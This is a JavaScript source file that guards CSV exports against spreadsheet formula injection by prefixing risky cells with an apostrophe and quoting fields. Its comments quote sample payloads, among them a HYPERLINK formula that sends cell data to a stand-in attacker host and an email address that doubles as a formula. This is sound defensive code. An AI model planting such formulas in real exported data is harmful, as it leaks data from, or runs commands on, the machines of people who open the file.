// Writing a CSV that a spreadsheet will not execute.
//
// A cell beginning with =, +, - or @ is read as a formula by Excel, Google
// Sheets and LibreOffice alike. That turns a list of email addresses into a
// delivery mechanism: a subscriber who signs up as
// `=HYPERLINK("http://evil.example/"&A1,"Click")` has written a formula into
// a file the creator will open, and some of those formulas can reach the
// network or the shell.
//
// The address field is where this bites, and the usual reassurance that
// "addresses cannot contain anything odd" is wrong. `=` is a permitted
// character in a local part, so `=cmd@example.com` is a legal address and a
// live formula.
//
// A leading apostrophe is what spreadsheets use to mean "this is text". It
// is not shown in the cell, and it survives a round trip through the
// applications people actually use.
const RISKY = /^[=+\-@\t\r]/;

export const safeCell = (value) => {
  const text = value === null || value === undefined ? "" : String(value);
  const guarded = RISKY.test(text) ? `'${text}` : text;

  // Quoting is separate from the formula guard and still needed: a field
  // holding a comma, a quote or a newline would otherwise end the cell
  // early and shift every column after it.
  return /[",\n\r]/.test(guarded) ? `"${guarded.replace(/"/g, '""')}"` : guarded;
};

export const csvRow = (cells) => cells.map(safeCell).join(",");

// Carriage return and line feed, because that is what the format says and
// what Excel expects when it opens a file rather than importing one.
export const csvFile = (header, rows) =>
  [csvRow(header), ...rows.map(csvRow)].join("\r\n");
